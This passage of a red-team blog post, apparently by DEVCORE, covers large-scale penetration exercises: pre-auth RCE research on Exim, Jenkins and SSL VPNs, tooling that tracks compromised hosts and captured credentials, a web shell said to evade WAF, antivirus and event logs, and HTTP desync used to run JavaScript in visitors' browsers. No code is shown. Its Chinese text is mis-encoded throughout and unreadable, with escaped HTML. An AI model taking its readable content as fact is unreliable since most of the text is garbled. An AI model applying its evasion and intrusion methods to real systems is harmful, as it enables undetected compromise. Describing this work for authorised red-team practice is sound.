ÄÅÁ†îÁ©∂ÁµÑÔºöÂÅµÊü•ÈÉ®ÂàÜÁ†îÁ©∂‰∫Ü‰∏çÂêåÁöÑÂÅµÊü•ÊñπÊ≥ïÂíå‰æÜÊ∫êÔºå‰∏¶‰∏îÈñãÁôºËá™Â∑±ÁöÑÂ∑•ÂÖ∑ËÆìÂÅµÊü•Êõ¥ÊúâÊïàÁéáÔºõÊàëÂÄëÁöÑÁâπÊîªÁµÑ‰πü‰∏çÊñ∑Âº∑ÂåñËá™Â∑±ÁöÑÊîªÊìäËÉΩÂäõÔºõÊúÄÈáçË¶ÅÁöÑÔºåÊàëÂÄëËÆìÁ†îÁ©∂‰∫∫Âì°ÈñãÂßãÈáùÂ∞çÊàëÂÄëÂ∏∏Á¢∞Âà∞ÁöÑÁõÆÊ®ôÈÄ≤Ë°åÁ†îÁ©∂ÔºåÈñãÁôºÁ¥ÖÈöäÊúÉÁî®Âà∞ÁöÑÂ∑•ÂÖ∑ÊàñÊäÄÂ∑ß„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÁâπÂà•ÊÉ≥Ë¶ÅÂàÜ‰∫´Á†îÁ©∂ÁµÑÁöÑÊàêÊûúÔºåÂõ†ÁÇ∫ÊàëÂÄëÊúÉÂéªÈñãÊé°‰∏Ä‰∫õÂü∫Á§éË®≠ÊñΩÁöÑ 0-dayÔºåÂú®Ë≤†Ë≤¨‰ªªÁöÑÊè≠Èú≤ÂæåÔºåÊúÉÂ∞á 1-day Áî®ÊñºÊºîÁ∑¥‰∏≠ÔºåÈÄôÁ®ÆÊ®°ÂºèÂ∞çÂúãÂ§ñÁ¥ÖÈöä‰æÜË™™ÁÆóÊòØÁõ∏Áï∂Â∞ëË¶ã„ÄÇÁÇ∫‰∫ÜËÉΩÂπ´Âä©Âà∞Á¥ÖÈöäÔºåÁ†îÁ©∂ÁµÑÂπ≥ÊôÇÁöÑÁ†îÁ©∂ÊñπÂêëÔºåÈÄöÂ∏∏ÈÉΩÊòØÊâæ‰ºÅÊ•≠Â§ñÁ∂≤ÂèØ‰ª•Á¢∞Âà∞ÁöÑÈÄöÁî®ÊúçÂãôÔºå‰æãÂ¶ÇÈÉµ‰ª∂‰º∫ÊúçÂô®„ÄÅJenkins„ÄÅSSL VPN„ÄÇÊàëÂÄëÊâæÁöÑÂº±ÈªûÈÉΩÊòØ‰ª•‰∏çÁî®Ë™çË≠â„ÄÅÂèØÂèñÂæó‰º∫ÊúçÂô®ÊéßÂà∂Ê¨äÁÇ∫ÂÑ™ÂÖàÔºåÁõÆÂâçÂ∑≤ÂÖ¨ÈñãÁöÑÊúâÔºö&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;Exim&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;FortiGate&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;Pulse Secure&lt;/a&gt;„ÄÇÈÄô‰∫õÊàêÊûúÂú®ÊºîÁ∑¥Áï∂‰∏≠ÈÉΩÊúâÈùûÂ∏∏ÈùûÂ∏∏È´òÁöÑÊà∞Áï•ÂÉπÂÄºÔºåÁîöËá≥ÂèØ‰ª•Ë™™ÊéåÊéß‰∫ÜÈÄô‰∫õ‰º∫ÊúçÂô®Âπæ‰πéÂ∞±ËÉΩÈñìÊé•ÊéßÂà∂‰ºÅÊ•≠ÁöÑÂ§ßÂçä„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÈÄô‰∫õÁ†îÁ©∂ÊàêÊûúÔºå‰πüÊÑèÂ§ñÁöÑË¢´ÂúãÂ§ñÊâÄÊ≥®ÊÑèÂà∞Ôºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PortSwigger ÈÄ£Á∫åÂÖ©Âπ¥Âπ¥Â∫¶ÂçÅÂ§ßÁ∂≤Á´ôÊîªÊìäÊäÄË°ìË©ïÈÅ∏ÂÜ†Ëªç (&lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018&quot;&gt;2018&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ÈÄ£Á∫å‰∏âÂπ¥ DEFCON &amp;amp; Black Hat USA ÁôºË°® (&lt;a href=&quot;https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-18/briefings/schedule/index.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-days-out-10346&quot;&gt;2018&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/index.html#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;2019&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;Âè∞ÁÅ£Á¨¨‰∏ÄÂÄãÊãøÂà∞ PWNIE AWARD ÁçéÈ†ÖÔºöPwnie for Best Server-Side Bug (Âπ¥Â∫¶ÊúÄ‰Ω≥‰º∫ÊúçÂô®ÊºèÊ¥û) (&lt;a href=&quot;https://pwnies.com/archive/2018/nominations/&quot;&gt;2018 ÂÖ•Âúç&lt;/a&gt;, &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;2019 ÂæóÁçé&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÁõÆÊ®ô‰∏äËê¨Âè∞Â¶Ç‰ΩïÁôºÊèÆÁ¥ÖÈöäÊïàÁõä&quot;&gt;ÁõÆÊ®ô‰∏äËê¨Âè∞ÔºåÂ¶Ç‰ΩïÁôºÊèÆÁ¥Ö„ÄåÈöä„ÄçÊïàÁõäÔºü&lt;/h3&gt;

&lt;p&gt;ÂâçÈù¢Èù†‰∫ÜÂÅµÊü•„ÄÅÁâπÊîª„ÄÅÁ†îÁ©∂ÁµÑÁöÑÊàêÊûúÂèñÂæó‰∫ÜÈÄ≤ÂÖ•Èªû„ÄÇ‰∏ã‰∏ÄÂÄãÂïèÈ°åÔºåÊòØÂú®ÊàëÂÄëÈÅéÂéªÁöÑÁ∂ìÈ©ó‰∏≠ÔºåÊúâÈÅéÂ§öÊ¨°ÊºîÁ∑¥ÁöÑÁØÑÂúçÊòØ‰∏äËê¨Âè∞ÈõªËÖ¶ÔºåÊàëÂÄëË¶ÅÊÄéÊ®£ÂÅöÊâçËÉΩÁôºÊèÆÂúòÈöä‰ΩúÊà∞ÁöÑÊïàÁõäÂë¢ÔºüÊúÉÊúâÈÄôÂÄãÂïèÈ°åÊòØÂõ†ÁÇ∫&lt;strong&gt;Êï∏ÈáèÁ¥ö&lt;/strong&gt;ÔºåÂ¶ÇÊûúÁØÑÂúçÂè™ÊúâÂçÅÂÄãÁ∂≤Á´ôÂæàÂÆπÊòìÊâæÁõÆÊ®ôÔºå‰ΩÜÊòØÁï∂Á∂≤Á´ôËÆäÂ§öÁöÑÊôÇÂÄôÔºåÂ∞±ÂæàÈõ£Ê®ôË®ªË®éË´ñÊàëÂÄëË¶ÅÊîªÊìäÁöÑÁõÆÊ®ô„ÄÇÊàñÊòØÁï∂Â§ßÂÆ∂Ë¶ÅÂêåÊ≠•ÈÄ≤Â∫¶ÁöÑÊôÇÂÄôÔºåÊØèÂÄã‰∫∫ÁöÑÈÄ≤Â∫¶ÈÉΩÂæàÂ§öÔºåÂæàÈõ£ÊúâÂÄãÂú∞ÊñπÂàÜ‰∫´‰º∫ÊúçÂô®Ë≥áË®äÔºåËÆìÂÖ∂‰ªñ‰∫∫ËÉΩÊé•Á∫å‰ªªÂãô„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÅéÂéªÊàëÂÄë‰ΩøÁî®È°û‰ºº Trello ÁöÑÁ≥ªÁµ±Ë®òÈåÑÊØèÂè∞‰º∫ÊúçÂô®ÁöÑÁãÄÊ≥ÅÔºåÂú®ÁØÑÂúçËºÉÂ∞èÁöÑÊôÇÂÄôÂæàÊñπ‰æøÂ•ΩÁî®Ôºå‰ΩÜÊòØÁï∂Ë≥áÊñôÈáè‰∏ÄÂ§ßÂ∞±ÊúÉÈ°ØÂæóÂæàÈõ£Êìç‰Ωú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âõ†Ê≠§ÔºåÊàëÂÄëËá™Ë°åÈñãÁôº‰∫ÜÁ≥ªÁµ±ÂéªËß£Ê±∫Áõ∏ÈóúÂïèÈ°å„ÄÇÂàÜ‰∫´‰∏Ä‰∫õÊàëÂÄëË®≠Ë®àÁ≥ªÁµ±ÁöÑÂøÖË¶ÅÂéüÂâá‰æõÂ§ßÂÆ∂ÂèÉËÄÉÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;‰º∫ÊúçÂô®ÂàóË°®ÂèØÊ®ôÁ±§„ÄÅÊéíÂ∫è„ÄÅÂÖ®ÊñáÊêúÂ∞ãÔºåÁÅ´ÂäõÈõÜ‰∏≠ÁöÑ‰º∫ÊúçÂô®ÂøÖÈ†àË¶ÅËá™ÂãïÂú®È°ØÁúºËôïÔºåÁúÅÂéªÈ°çÂ§ñÊêúÂ∞ãÊôÇÈñì„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë¶ÅÂèØËá™ÂãïÂª∫Á´ã‰∏ªÊ©üÈóú‰øÇÂúñÔºåÊñπ‰æøÂúòÈöäË®éË´ñÊà∞Ê≥Å„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÑ≤Â≠òÁµêÊßãÂåñË≥áË®äËÄåÈùûÈÅéÂéªÁöÑÁ¥îÂ≠ó‰∏≤Ôºå‰æãÂ¶ÇÈÄôÂè∞Ê©üÂô®ÈñãÁöÑÊúçÂãôË≥áË®ä„ÄÅÊãø shell ÁöÑÊñπÂºè„ÄÅÂ∑≤Êª≤ÈÄèÁöÑÂ∏≥ËôüÂØÜÁ¢º„ÄÇÊñπ‰æøÂø´ÈÄüÈáêÊ∏ÖÁõÆÂâçÈÄ≤Â∫¶‰ª•Âèä‰∫ãÂæåÂàÜÊûê„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âª∫Á´ã shell ‰∏ªÊéßÂè∞ÔºåÊñπ‰æøÊàêÂì°‰∏ÄÈçµÂèñÂæó shell Êìç‰Ωú„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âè¶Â§ñÈÇÑÊúâ‰∏ÄÂÄãÂïèÈ°åÔºåÁ¥ÖÈöäÊàêÂì°ÈÄôÈ∫ºÂ§öÔºåÊà∞Â†¥ÂèàÂàÜÊï£ÔºåÂ¶ÇÊûúÊÉ≥Ë¶ÅÊääÊàëÂÄëÂÅöÈÅéÁöÑÊ∏¨Ë©¶ÈÅéÁ®ãË®òÈåÑ‰∏ã‰æÜÔºå‰∏çÊòØÊúÉÂæàË§áÈõúÂóéÔºüÊâÄ‰ª•ÊàëÂÄëÂè¶Â§ñÂØ´‰∫Ü plugin Ë®òÈåÑ web ÁöÑÊîªÊìäÊµÅÈáè„ÄÅ‰ª•ÂèäË®òÈåÑÊàëÂÄëÂú® shell ‰∏ãÈÅéÁöÑÊåá‰ª§Âíå‰º∫ÊúçÂô®ÂõûÂÇ≥ÁöÑÁµêÊûúÔºåÈÄô‰∫õË®òÈåÑÁîöËá≥ÊØîÂÆ¢Êà∂ÁöÑ access_log Âíå bash_history ÈÇÑË©≥Á¥∞„ÄÇÊ≠§Â§ñÔºåÈáùÂ∞çÊØèÂÄãÁõÆÊ®ô‰º∫ÊúçÂô®ÔºåÊàëÂÄë‰πüÊúÉÁâπÂà•Ë®òÈåÑÂú®‰∏äÈù¢ÊâÄÂÅöÈÅéÁöÑÈáçË¶ÅË°åÁÇ∫Ôºå‰æãÂ¶ÇÔºöÊîπ‰∫Ü‰ªÄÈ∫ºË®≠ÂÆöÔºåÊñ∞Â¢ûÊàñÂà™Èô§‰∫Ü‰ªÄÈ∫ºÊ™îÊ°àÔºåÊñπ‰æøÊàëÂÄëÈÇÑÊúâÂÆ¢Êà∂ËøΩËπ§„ÄÇË¶ÅÂÅöÈÄôÊ®£ÁöÑÂÆ¢Ë£ΩÂåñË®òÈåÑÂÖ∂ÂØ¶ÊòØÂæàÁπÅÁë£ÁöÑÔºåÂ∞çÈÇ£‰∫õÁøíÊÖ£ÊñºËá™ÂãïÂåñËß£Ê±∫‰∫ãÊÉÖÁöÑÈß≠ÂÆ¢Êõ¥ÊòØÔºå‰ΩÜÊàëÂÄëÂ∞±ÊòØÂ†ÖÊåÅÂÅöÂ•ΩÈÄôÊ®£ÁöÑÁ¥ÄÈåÑÔºåÂç≥‰ΩøÂÆ¢Êà∂Ê≤íÊúâË¶ÅÊ±ÇÔºåÊàëÂÄëÈÇÑÊòØÊúÉË©≥ÂØ¶Ë®òÈåÑÊØèÂÄãÊ≠•È©üÔºå‰ª•ÂÇô‰∏çÊôÇ‰πãÈúÄ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;‰ºÅÊ•≠ÊúâÈò≤Á¶¶Ë®≠ÂÇôÊàñÊ©üÂà∂&quot;&gt;‰ºÅÊ•≠ÊúâÈò≤Á¶¶Ë®≠ÂÇôÊàñÊ©üÂà∂Ôºü&lt;/h3&gt;

&lt;p&gt;Ëß£Ê±∫‰∫ÜÁ™ÅÁ†¥ÈªûÂíåÂ§ö‰∫∫Âêà‰ΩúÁöÑÂïèÈ°åÔºåÊé•‰∏ã‰æÜÊàëÂÄëÈù¢Ëá®Âà∞Á¨¨‰∏âÂÄãÂïèÈ°åÔºå‰ºÅÊ•≠ÊúâÈò≤Ë≠∑Êé™ÊñΩÔºÅÂú®Á†îË®éÊúÉ‰∏≠ÊàëËàâ‰∫ÜÂπæÂÄãËºÉÂÆ¢Ë£ΩÁöÑÁúüÂØ¶Èò≤Á¶¶Ê°à‰æãÔºåË™™ÊòéÊàëÂÄëÈô§‰∫ÜÂ∏∏Ë¶ãÁöÑÈò≤Á¶¶Ë®≠ÂÇôÂ§ñ‰πüÊìÅÊúâÂæàÂ§öË∑üÈò≤Á¶¶Ê©üÂà∂‰∫§ÊâãÁöÑÁ∂ìÈ©ó„ÄÇÊàëÂÄëÊúÉÁ†îÁ©∂ÊØèÁ®ÆÈò≤Á¶¶ÁöÑÁâπÊÄßÂä†‰ª•ÁπûÈÅéÊàñÂà©Áî®ÔºåÁîöËá≥ÊúÉÂØ´Â∑•ÂÖ∑ÂéªË∫≤ÈÅøÂÅµÊ∏¨ÔºåÊúÄËøëÊØîËºÉÁ∂ìÂÖ∏ÁöÑÊòØÂúòÈöäÂÅö‰∫ÜÂú® Windows ‰º∫ÊúçÂô®‰∏äÁöÑ Web shellÔºåÂÆÉÂèØ‰ª•ÂÅöÂà∞ WAF Êäì‰∏çÂà∞ÔºåÈò≤ÊØíËªüÈ´îÊäì‰∏çÂà∞Ôºå‰πü‰∏çÊúÉÊúâ eventlog Ë®òÈåÑÔºåÂà©Áî®ÈÄôÂÄãÂ∑•ÂÖ∑ÂèØ‰ª•ÁÑ°ËÅ≤ÁÑ°ÊÅØÊî∂ÈõÜ‰º∫ÊúçÂô®‰∏äÊàëÂÄëÈúÄË¶ÅÁöÑË≥áÊñô„ÄÇÁï∂ÁÑ∂ÔºåÊàëÂÄë‰∏çÊòØÁÑ°ÊïµÁöÑÔºå‰∏Ä‰∫õËºÉÂ∫ïÂ±§ÁöÑÂÅµÊ∏¨Ê©üÂà∂ÈÇÑÊòØÊúÉÁÑ°Ê≥ïÁπûÈÅé„ÄÇÈÄôÈÇäÊàëÁõ¥Êé•Ë¨õÊàëÂÄëÈÄ≤ÂåñÂà∞ÁõÆÂâçÁöÑÊ∫ñÂâáÔºöÂú®Èù¢Â∞ç‰º∫ÊúçÂô®Èò≤Á¶¶Ê©üÂà∂ÔºåÊàëÂÄëËÉΩÈö±ÂåøÁöÑÔºå‰∏ÄÂÆöÂÅöÂà∞ÁµïÂ∞çÁöÑÈö±ÂåøÔºåÁÑ°Ê≥ïË∫≤ÁöÑÔºåÂ∞±ÊääÊµÅÁ®ãÊúÄ‰Ω≥ÂåñÔºåÁ∏ÆÁü≠ÂÅö‰∫ãÊÉÖÁöÑÊôÇÈñìÔºå‰æãÂ¶ÇÊéßÂà∂Âú®‰∫îÂàÜÈêòÂÖßÊèêÊ¨äÊãøÂà∞ÈóúÈçµË≥áÊñôÔºåÂ∞±ÁÆóË¢´Âà•‰∫∫ÊäìÂà∞‰πüÊ≤íÈóú‰øÇÔºåÂõ†ÁÇ∫Ë©≤ÊãøÁöÑË≥áÊñô‰πüÊãøÂà∞‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Á¥ÖÈöäÊàêÂì°ÊáâÂÖ∑ÂÇôÁöÑÁâπË≥™&quot;&gt;Á¥ÖÈöäÊàêÂì°ÊáâÂÖ∑ÂÇôÁöÑÁâπË≥™&lt;/h2&gt;

&lt;p&gt;Ë¶ÅËÉΩÂ§†Âú®Á¥ÖÈöäÊºîÁ∑¥‰∏≠ÊúâÁ™ÅÂá∫ÊàêÊûúÔºåÊàëË¶∫ÂæóÊàêÂì°ÁâπË≥™ÊòØÊªøÈóúÈçµÁöÑ‰∏ÄÂÄãÈªû„ÄÇ‰ª•‰∏ãÊï¥ÁêÜ‰∫ÜÂπæÂÄãÊàëÂæûÊàëÂÄëÁ¥ÖÈöäÂ§•‰º¥ËßÄÂØüÂà∞ÁöÑÁâπË≥™Ë∑üÂ§ßÂÆ∂ÂàÜ‰∫´ÔºåÂ¶ÇÊûúÂ∞á‰æÜÊúâÊâìÁÆóÂæû‰∫ãÁ¥ÖÈöäÂ∑•‰ΩúÔºåÊàñÊòØ‰ºÅÊ•≠Â∑≤Á∂ìÊâìÁÆóÈñãÂßãÊàêÁ´ãÂÖßÈÉ®Á¥ÖÈöäÔºåÈÄô‰∫õÁâπË≥™ÂèØËÉΩÂèØ‰ª•‰ΩúÁÇ∫‰∏Ä‰∫õÂèÉËÄÉ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÊÉ≥ÂÉèÂäõ&quot;&gt;ÊÉ≥ÂÉèÂäõ&lt;/h3&gt;

&lt;p&gt;Á¨¨‰∏ÄÂÄãÊòØÊÉ≥ÂÉèÂäõÔºåÁÇ∫‰ªÄÈ∫ºÊúÉÊèêÈÄôÂÄãÁâπË≥™ÔºåÂõ†ÁÇ∫ÁèæÂú®Ë≥áÂÆâÊÑèË≠òÊÖ¢ÊÖ¢Âº∑ÂåñÔºåË¶ÅÈù†‰∏ÄÊãõÊâìÂ§©‰∏ãÊòØ‰∏çÂ§™ÊúâÊ©üÊúÉÁöÑÔºåÂ∞§ÂÖ∂ÊòØÁ¥ÖÈöäÊºîÁ∑¥ÈÄôÈ∫ºÊúâËÆäÂåñÁöÑÂ∑•‰Ωú„ÄÇË¶ÅÊúâÊàêÊûú‰∏ÄÂÆöË¶ÅÂ∑ßÂ¶ôÁöÑÁµÑÂêàÂà©Áî®ÊàñÊòØÁπûÈÅéÊâçÊúâÊ©üÊúÉ„ÄÇ&lt;/p&gt;

&lt;p&gt;Áõ¥Êé•ËàâÂÄã‰æãÂ≠êÔºåÊàëÂÄëÂú®ÂÖ¨Â∏É Pulse Secure VPN ÁöÑ&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;Á†îÁ©∂Á¥∞ÁØÄ&lt;/a&gt;ÂæåÔºåÊúâ‰∫∫Âú® twitter ‰∏ä&lt;a href=&quot;https://twitter.com/_trou_/status/1168529031177867267&quot;&gt;Ë°®Á§∫&lt;/a&gt;ÈÇ£ÂÄãÈóúÈçµÁî®‰æÜ RCE ÁöÑ argument injection Èªû‰πãÂâç‰ªñÊúâÊâæÂà∞ÔºåÂè™ÊòØÁÑ°Ê≥ïÂà©Áî®ÊâÄ‰ª•ÂÆòÊñπ‰πüÊ≤íÊúâ‰øÆ„ÄÇÁ¢∫ÂØ¶ÊàëÂÄëÊâæÂà∞ÁöÑÂú∞ÊñπÁõ∏ÂêåÔºå‰∏çÈÅéÊàëÂÄëÈù†ÊÉ≥ÂÉèÂäõÊâæÂà∞‰∫Ü‰∏ÄÂÄãÂèØÂà©Áî®ÂèÉÊï∏‰∏¶Êê≠ÈÖç Perl ÁöÑÁâπÊÄß‰∏≤Âá∫‰∫Ü RCE„ÄÇ
Âè¶‰∏ÄÂÄã‰æãÂ≠êÊòØ &lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins Á†îÁ©∂&lt;/a&gt;Ë£°Èù¢ÁöÑ‰∏ÄÁí∞ÔºåÊàëÂÄëÂú®ÁπûÈÅéË∫´ÂàÜË™çË≠â‰πãÂæåÁôºÁèæÊúâ‰∏ÄÂÄãÂäüËÉΩÊòØÂú®Ê™¢Êü•‰ΩøÁî®ËÄÖËº∏ÂÖ•ÁöÑÁ®ãÂºèË™ûÊ≥ïÊ≠£‰∏çÊ≠£Á¢∫„ÄÇ‰º∫ÊúçÂô®ÊÄéÊ®£ÂéªÂà§Êñ∑Ë™ûÊ≥ïÊ≠£‰∏çÊ≠£Á¢∫ÔºüÊúÄÁ∞°ÂñÆÁöÑÊñπÊ≥ïÂ∞±ÊòØÁõ¥Êé•ÂéªÁ∑®Ë≠ØÁúãÁúãÔºåÂèØ‰ª•Á∑®Ë≠ØÊàêÂäüÂ∞±‰ª£Ë°®Ë™ûÊ≥ïÊ≠£Á¢∫„ÄÇÊâÄ‰ª•ÊàëÂÄëÁ†îÁ©∂‰∫ÜÂèØ‰ª•Âú®„ÄéÁ∑®Ë≠ØÈöéÊÆµ„ÄèÂëΩ‰ª§Âü∑Ë°åÁöÑÊñπÊ≥ïÔºåËÆì‰º∫ÊúçÂô®Âú®ÂòóË©¶Âà§Êñ∑Ë™ûÊ≥ïÊòØÂê¶Ê≠£Á¢∫ÁöÑÂêåÊôÇÂü∑Ë°åÊàëÂÄëÁöÑÊåá‰ª§„ÄÇÈÄôÂÄãÊâãÊ≥ïÈÅéÂéªÊ≤íÊúâ‰∫∫ÊèêÈÅéÔºåÁÆóÊòØÈÅãÁî®ÊÉ≥ÂÉèÂäõÁöÑ‰∏ÄÂÄãÁ∂ìÂÖ∏Ê°à‰æã„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈóúÊñºÊÉ≥ÂÉèÂäõÔºåÂÖ∂ÂØ¶ÈÇÑÊúâ‰∏ÄÂÄãÈö±ËóèÁöÑÂâçÊèêÔºöÂü∫Á§éÂäüË¶ÅÂ§†„ÄÇÊàë‰∏ÄÁõ¥Ë™çÁÇ∫ÊÉ≥ÂÉèÂäõÊòØÁü•Ë≠òÁöÑÊéíÂàóÁµÑÂêàÔºå‰æãÂ¶ÇÂâõÂâõÁöÑÂÖ©ÂÄã‰æãÂ≠êÔºåÂ¶ÇÊûú‰∏çÁü•ÈÅì Perl Ë™ûÊ≥ïÁâπÊÄßÂíå Meta-Programming ÁöÑÁü•Ë≠òÔºåÂÜçÊÄéÈ∫ºÂ§©È¶¨Ë°åÁ©∫ÈÉΩÊòØ‰∏çÂèØËÉΩÊàêÂäü RCE ÁöÑ„ÄÇÊúâÂü∫Á§éÂäüÂÜçÂä†‰∏äÂãáÊñºËÅØÊÉ≥ÂíåÂòóË©¶ÔºåÁµïÂ∞çÊòØ‰∏ÄÂÄãÁ¥ÖÈöäÂ§ßÂ∞áÁöÑÂøÖÂÇôÁâπË≥™„ÄÇËá≥ÊñºÂü∫Á§éÂäüÈúÄË¶ÅÂà∞‰ªÄÈ∫ºÁ®ãÂ∫¶ÔºåÂ∞çÊàëÂÄë‰æÜË™™ÔºåË¨õÂà∞‰∏ÄÂÄãÊºèÊ¥ûÔºåÂøÉ‰∏≠Â∞±ÊúÉÂêåÊôÇË∑≥Âá∫‰∏ÄÂÄãÊ®πÁãÄÂúñÔºöÂá∫ÁèæÊàêÂõ†ÊòØ‰ªÄÈ∫ºÔºüÁõ∏ÈóúÁöÑÊ°à‰æã„ÄÅÊºèÊ¥û„ÄÅÁπûÈÅéÊñπÂºèÈÉΩÊúÉÂïµÂïµÂïµË∑≥Âá∫‰æÜÔºåËÉΩÂÅöÂà∞ÈÄôÊ®£ÊàëÊÉ≥Â∞±Â∑≤Á∂ìÊòØÊúâÊâÄÂ∞èÊàê‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ËøΩÊñ∞ÊäÄË°ì&quot;&gt;ËøΩÊñ∞ÊäÄË°ì&lt;/h3&gt;

&lt;p&gt;ÊúÉËøΩÊñ∞ÊäÄË°ìÈÄô‰ª∂‰∫ãÊÉÖÔºå‰ºº‰πéÊòØË≥áÂÆâÂúàÁöÑÊ®ôÈÖçÔºåÊàëÂÄëÁöÑ‰∏ñÁïå‰∏çÂè™Êúâ OWASP TOP 10„ÄÇÊõ¥ÁèæÂØ¶ÁöÑË™™Ê≥ïÊòØÔºåÂ¶ÇÊûúÂè™Èù†ÈÄôÈ∫º‰∏ÄÈªûÁü•Ë≠òÔºåÂú®Á¥ÖÈöäÊºîÁ∑¥ËÉΩÁôºÊèÆÁöÑÊïàÊûúÂÖ∂ÂØ¶‰∏¶‰∏çÂ§ß„ÄÇÂàÜ‰∫´‰∏Ä‰∏ãÊàëÁúãÂà∞ÊàêÂì°ÂÄëÁöÑÊ®£Â≠êÔºåÂ∞çÊñº‰ªñÂÄë‰æÜË™™ÔºåÁúãÊñ∞ÊäÄË°ìÊòØÊØèÂ§©ÁöÑÁøíÊÖ£ÔºåÂ¶ÇÊûúÊúâË≥áÂÆâÁ†îË®éÊúÉÊäïÂΩ±ÁâáÈáãÂá∫ÔºåÊúÉËøΩ„ÄÇÊñ∞ÊäÄË°ìË£°ÊúâËààË∂£ÁöÑÔºåÊúÉÂãïÊâãÁé©ÔºåÁîöËá≥ÂØ´ÊàêÂ∑•ÂÖ∑ÔºåÊàëÂÄëÂæàÂ§öÂÖßÈÉ®Â∑•ÂÖ∑ÈÉΩÊòØÈÄôÊ®£ÈªòÈªòË£úÂº∑ÁöÑ„ÄÇÈÇÑÊúâ‰∏ÄÈªûÔºåÁúãÊñ∞ÊäÄË°ìÊúÄÁµÇÁõÆÁöÑÂ∞±ÊòØË¶ÅÊ¥ªÁî®ÔºåÊãøÊñ∞ÊäÄË°ìËß£Ê±∫ËàäÂïèÈ°åÔºåÂæÄÂæÄÊúâÊ©üÊúÉÁôºÁèæ‰∏Ä‰∫õÁ™ÅÁ†¥ÊñπÂºè„ÄÇ‰æãÂ¶ÇÊàëÂÄëÂú®‰ªäÂπ¥ÂÖ´Êúà BlackHat Á†îË®éÊúÉÁúãÂà∞‰∫Ü &lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;HTTP Desync&lt;/a&gt; ÁöÑÊîªÊìäÊñπÂºèÔºåÂõûÂúã‰πãÂæåÈ¶¨‰∏äÂ∞±ÊääÈÄôÂÄãÁü•Ë≠òÁî®Âú®Áï∂ÊôÇÁöÑÂ∞àÊ°à‰∏äÔºåËÆìÊàëÂÄëÂ§ö‰∫Ü‰∏Ä‰∫õÊîªÊìäÈù¢ÂêëÔºÅÔºàÈÄôÂÄãÊâãÊ≥ïÊå∫ÊúâË∂£ÁöÑÔºåÂú®ÊàëÂÄëÊ±°Êüì‰º∫ÊúçÂô®ÂæåÔºåÈö®Ê©ü‰∏ÄÂÄã‰∫∫ÁÄèË¶ΩÂÆ¢Êà∂Á∂≤È†ÅÂ∞±ÊúÉÂü∑Ë°åÊàëÂÄëÁöÑ JavaScriptÔºå‰∏çÈúÄË¶Å‰ªÄÈ∫ºÁâπÊÆäÊ¢ù‰ª∂ÔºåÊúâËààË∂£ÂèØ‰ª•Á†îÁ©∂‰∏Ä‰∏ã:p Ôºâ&lt;/p&gt;

&lt;h3 id=&quot;Áõ∏‰ø°‰ª•ÂèäÂ†ÖÊåÅ&quot;&gt;Áõ∏‰ø°‚Ä¶‰ª•ÂèäÂ†ÖÊåÅ&lt;/h3&gt;

